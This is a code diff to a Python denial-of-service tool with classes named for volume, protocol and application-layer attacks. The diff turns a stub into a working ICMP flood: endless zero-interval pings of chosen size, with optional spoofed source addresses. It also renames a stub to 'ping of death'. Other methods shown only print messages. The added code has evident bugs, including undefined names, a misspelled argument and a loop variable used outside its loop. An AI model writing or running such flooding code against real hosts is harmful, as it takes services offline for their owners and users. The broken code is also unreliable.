@@ -1,6 +1,8 @@
 import requests as res
 import socket as sockk
 import time
+import ping3
+import platform
 
 class VolumeBasedAttack:
     def udp_flooding(bye, vector, port):
@@ -18,15 +20,41 @@ class VolumeBasedAttack:
             s.close() 
         
         
-    def icmp(vector, bye, port):
-        print(f"ICMP attack on {vector} with {len(bye)} bytes")
+    def icmp(vector, bye):
+        if platform.system() == 'Linux':
+            wifi = input("in linux u can use also wifi in ping mode, u want? (y/n) \n")
+            if wifi == 'y':
+                for i in vector:
+                    ping3.verbose_ping(i, interface='wifi0', size=bye, count=0, interval=0)
+            else:
+                addre = input("u can also choose a source address, u want? (y/n) \n")
+                if addr == y:
+                    sources = input("write the ip addres(addresses): \n").split(" ")
+                    for i in vector:
+                        for ad in sources:
+                            ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
+                else:
+                    for i in vector:
+                        ping3.verbose_ping(i, size=bye, count=0, interval=0)
+                    
+        if platform.system() == 'Windows':
+            response = input("u can choose a source address, u want? (y/n) \n")
+            if response.lower() == 'y':
+                source = input("write the ip addres(addresses): \n").split(" ")
+                print("icmp attack with source addr ", source)
+                for i in vector:
+                    for ad in source:
+                        ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
+            else:
+                print("No source address selected.\n")
+                ping3.verbose_ping(i, size=bye, conut=0, interval=0)
 
 class ProtocolAttack:
     def syn_flood(vector, bye, port):
         print(f"SYN flood attack on {vector} with {len(bye)} bytes")
 
-    def pof(vector, bye, port):
-        print(f"POF attack on {vector} with {len(bye)} bytes")
+    def pod(vector, bye, port):
+        print(f"POD attack on {vector} with {len(bye)} bytes")
 
 class ApplicationLayerAttack:
     def post(vector, bye):
